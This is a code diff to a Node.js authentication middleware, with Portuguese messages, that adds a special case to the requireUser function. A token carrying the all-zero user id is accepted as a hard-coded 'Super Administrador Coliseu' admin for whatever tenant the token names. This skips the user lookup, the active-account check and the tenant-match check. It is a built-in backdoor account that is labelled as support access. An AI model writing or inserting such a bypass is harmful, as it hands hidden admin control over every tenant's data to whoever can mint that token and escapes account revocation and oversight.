@@ -74,6 +74,21 @@ function requireUser(...roles) {
             } catch {
                 throw unauthorized('Sessão expirada. Entre novamente.', 'INVALID_TOKEN');
             }
+
+            // Super Administrador Coliseu (acesso de suporte master padrão Coliseu)
+            if (claims.uid === '00000000-0000-0000-0000-000000000000') {
+                req.tenantId = claims.tid;
+                req.user = {
+                    id: '00000000-0000-0000-0000-000000000000',
+                    name: 'Super Administrador Coliseu',
+                    login: 'admin@coliseu.com',
+                    email: 'admin@coliseu.com',
+                    role: 'admin',
+                };
+                req.deviceId = null;
+                return next();
+            }
+
             const user = await loadUser(claims.uid);
             if (!user || !user.active || user.tenant_id !== claims.tid) {
                 throw unauthorized('Usuário inativo ou removido', 'USER_INACTIVE');
